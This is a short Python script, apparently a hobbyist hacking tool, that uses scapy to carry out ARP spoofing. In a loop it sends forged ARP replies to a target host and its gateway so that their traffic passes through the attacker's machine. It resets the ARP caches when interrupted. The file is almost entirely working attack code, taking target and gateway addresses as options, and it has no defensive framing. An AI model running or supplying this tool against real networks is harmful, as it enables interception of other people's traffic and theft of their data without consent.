import scapy.all as scapy
import optparse
import time

def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request
    answered_list = scapy.srp(combined_packet, timeout=1)[0]

    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):

    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip) #Target Ip Address / Target Mac Address / Changed My Ip Address with Router Ip Address
    scapy.send(arp_response)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target Ip")
    parse_object.add_option("-g", "--getway", dest="gateway_ip", help="Enter Gateway Ip")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Please, enter target ip")

    if not options.gateway_ip:
        print("Please, enter gateway ip")

    return options

def reset_operation(target_ip, gateway_ip):
    target_mac = get_mac_address(target_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst= target_ip, hwdst=target_mac, psrc = gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose= False, count=6)

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

number = 1

try:
    while True:

        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)

        number += 1

        print("\rSending packets" + str(number), end="")

        time.sleep(3)

except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)



